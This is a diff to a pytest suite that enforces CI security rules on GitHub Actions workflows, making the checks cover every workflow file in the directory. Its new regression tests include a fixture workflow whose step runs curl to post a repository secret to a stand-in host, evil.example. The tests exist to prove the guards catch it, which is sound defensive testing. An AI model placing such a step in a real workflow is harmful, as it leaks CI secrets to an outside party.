@@ -7,6 +7,7 @@ import re
 import subprocess
 from pathlib import Path
 
+import pytest
 import yaml
 
 ROOT = Path(__file__).resolve().parents[1]
@@ -107,10 +108,46 @@ def _workflow(path: Path) -> dict:
     return yaml.load(path.read_text(encoding="utf-8"), Loader=yaml.BaseLoader)
 
 
+def _workflow_paths() -> list[Path]:
+    """Every workflow in the directory.
+
+    Derived from the filesystem rather than from a constant on purpose. The
+    earlier version of the secret invariants walked two hard-coded paths, so a
+    new `.github/workflows/anything.yml` subscribing to `merge_group` with an
+    unguarded secret satisfied the whole suite (`VOYN-W0-AICC-WORKFLOW-LIST-HARDCODED`).
+    """
+    directory = ROOT / ".github/workflows"
+    paths = sorted(p for p in directory.iterdir() if p.suffix in {".yml", ".yaml"})
+    assert paths, f"no workflows found under {directory}"
+    return paths
+
+
+def _triggers_include_merge_group(triggers: object) -> bool:
+    """Whether a workflow's ``on:`` admits the merge queue."""
+    if triggers == "merge_group":
+        return True
+    if isinstance(triggers, list):
+        return "merge_group" in triggers
+    if isinstance(triggers, dict):
+        return "merge_group" in triggers
+    return False
+
+
+def _merge_group_workflow_paths() -> list[Path]:
+    """Workflows that subscribe to `merge_group`, discovered from the directory.
+
+    The merge queue is a base-repository event: secrets are passed, and the ref
+    can carry a fork's commits. Any new file that opts into that trigger must
+    enter the same sweeps as `ci.yml` / `arch-fitness.yml` — SHA pins, canaries
+    for known jobs, and the secret invariants that walk the whole directory.
+    """
+    return [path for path in _workflow_paths() if _triggers_include_merge_group(_workflow(path).get("on"))]
+
+
 def _all_jobs() -> dict[str, dict]:
-    jobs = {}
-    for path in (CI_WORKFLOW, BOUNDARY_WORKFLOW):
-        jobs.update(_workflow(path)["jobs"])
+    jobs: dict[str, dict] = {}
+    for path in _merge_group_workflow_paths():
+        jobs.update(_workflow(path).get("jobs") or {})
     return jobs
 
 
@@ -267,7 +304,7 @@ exit "$SERIAL_RC"
         encoding="utf-8",
     )
     fake_pytest.chmod(0o755)
-    (tmp_path / "selected-tests.txt").write_text(selection, encoding="utf-8")
+    (tmp_path / "selected-tests.txt").write_text(selection, encoding="utf-8", newline="\n")
     env = {
         **os.environ,
         "PATH": f"{bin_dir}{os.pathsep}{os.environ['PATH']}",
@@ -347,20 +384,6 @@ TRUST_GUARD = "python scripts/assert_trusted_head_repository.py"
 # declared no shell, took the `windows-latest` default of `pwsh`, and did
 # exactly that.
 ABORTING_SHELLS = {"bash", "sh"}
-
-
-def _workflow_paths() -> list[Path]:
-    """Every workflow in the directory.
-
-    Derived from the filesystem rather than from a constant on purpose. The
-    earlier version of the secret invariants walked two hard-coded paths, so a
-    new `.github/workflows/anything.yml` subscribing to `merge_group` with an
-    unguarded secret satisfied the whole suite.
-    """
-    directory = ROOT / ".github/workflows"
-    paths = sorted(p for p in directory.iterdir() if p.suffix in {".yml", ".yaml"})
-    assert paths, f"no workflows found under {directory}"
-    return paths
 
 
 def _secret_names(value: object) -> set[str]:
@@ -488,9 +511,103 @@ def test_the_secret_invariants_see_every_workflow_in_the_directory() -> None:
         CI_WORKFLOW.name,
         BOUNDARY_WORKFLOW.name,
     }
-    assert len(_workflow_paths()) == len(
-        list((ROOT / ".github/workflows").glob("*.y*ml"))
-    )
+    assert len(_workflow_paths()) == len(list((ROOT / ".github/workflows").glob("*.y*ml")))
+    # Merge-queue sweeps used to hard-code the same two paths. They must track
+    # the directory the same way the secret invariants do.
+    merge_group_names = {path.name for path in _merge_group_workflow_paths()}
+    assert merge_group_names >= {CI_WORKFLOW.name, BOUNDARY_WORKFLOW.name}
+    assert merge_group_names == {
+        path.name
+        for path in _workflow_paths()
+        if _triggers_include_merge_group(_workflow(path).get("on"))
+    }
+
+
+_ZZ_EVIL_UNGUARDED_SECRET = """\
+on:
+  merge_group:
+jobs:
+  leak:
+    name: Leak a standing secret
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exfiltrate
+        run: curl https://evil.example/ -d "$TOKEN"
+        env:
+          TOKEN: ${{ secrets.AIOS_ARTIFACT_READ_TOKEN }}
+"""
+
+
+_ZZ_EVIL_UNPINNED_ACTION = """\
+on:
+  merge_group:
+jobs:
+  leak:
+    name: Mutable tag action
+    runs-on: ubuntu-latest
+    steps:
+      - name: Check out
+        uses: actions/checkout@v4
+"""
+
+
+def test_a_new_workflow_with_merge_group_and_unguarded_secret_fails_the_suite(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """A brand-new workflow file is in scope; the suite protects a property.
+
+    Acceptance dropped `.github/workflows/zz-evil.yml` into the tree while the
+    secret invariants still walked two hard-coded paths, and the whole policy
+    suite stayed green (`10 passed, 1 skipped`). Enumeration from the directory
+    must make that file fail the guard check.
+    """
+    import tests.test_release_gate_policy as policy  # noqa: PLW0406 -- patch module globals
+
+    workflows = tmp_path / ".github" / "workflows"
+    workflows.mkdir(parents=True)
+    (workflows / "zz-evil.yml").write_text(_ZZ_EVIL_UNGUARDED_SECRET, encoding="utf-8")
+    monkeypatch.setattr(policy, "ROOT", tmp_path)
+
+    assert {path.name for path in policy._workflow_paths()} == {"zz-evil.yml"}
+    assert {path.name for path in policy._merge_group_workflow_paths()} == {"zz-evil.yml"}
+
+    offenders: list[tuple[str, str, str | None, str]] = []
+    for path, job_id, _job, step in policy._secret_bearing_steps():
+        first = policy._first_command(step.get("run", ""))
+        if first != policy.TRUST_GUARD:
+            offenders.append((path.name, job_id, step.get("name"), first))
+    assert offenders == [
+        ("zz-evil.yml", "leak", "Exfiltrate", 'curl https://evil.example/ -d "$TOKEN"')
+    ]
+
+    # The aborting-shell invariant refuses the same step: no `shell: bash`.
+    shell_offenders = []
+    for path, job_id, job, step in policy._secret_bearing_steps():
+        shell = step.get("shell")
+        if shell not in policy.ABORTING_SHELLS:
+            inherited = ((job.get("defaults") or {}).get("run") or {}).get("shell")
+            shell_offenders.append(
+                (path.name, job_id, step.get("name"), shell or f"inherited:{inherited}")
+            )
+    assert shell_offenders == [("zz-evil.yml", "leak", "Exfiltrate", "inherited:None")]
+
+
+def test_a_new_merge_group_workflow_with_an_unpinned_action_fails_sha_pin(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    """SHA pinning follows the directory too, not the two known filenames."""
+    import tests.test_release_gate_policy as policy  # noqa: PLW0406 -- patch module globals
+
+    workflows = tmp_path / ".github" / "workflows"
+    workflows.mkdir(parents=True)
+    (workflows / "zz-evil.yml").write_text(_ZZ_EVIL_UNPINNED_ACTION, encoding="utf-8")
+    monkeypatch.setattr(policy, "ROOT", tmp_path)
+
+    jobs = policy._all_jobs()
+    assert set(jobs) == {"leak"}
+    uses = [step.get("uses") for step in jobs["leak"]["steps"] if step.get("uses")]
+    assert uses == ["actions/checkout@v4"]
+    assert not any(re.fullmatch(r"[^@]+@[0-9a-f]{40}", value) for value in uses)
 
 
 def test_every_required_context_has_a_deliberate_failure_canary() -> None:
@@ -508,7 +625,7 @@ def test_every_required_context_has_a_deliberate_failure_canary() -> None:
 
 def test_all_actions_are_immutable_sha_pinned() -> None:
     for job in _all_jobs().values():
-        for step in job["steps"]:
+        for step in job.get("steps") or []:
             if uses := step.get("uses"):
                 assert re.fullmatch(r"[^@]+@[0-9a-f]{40}", uses), uses
 
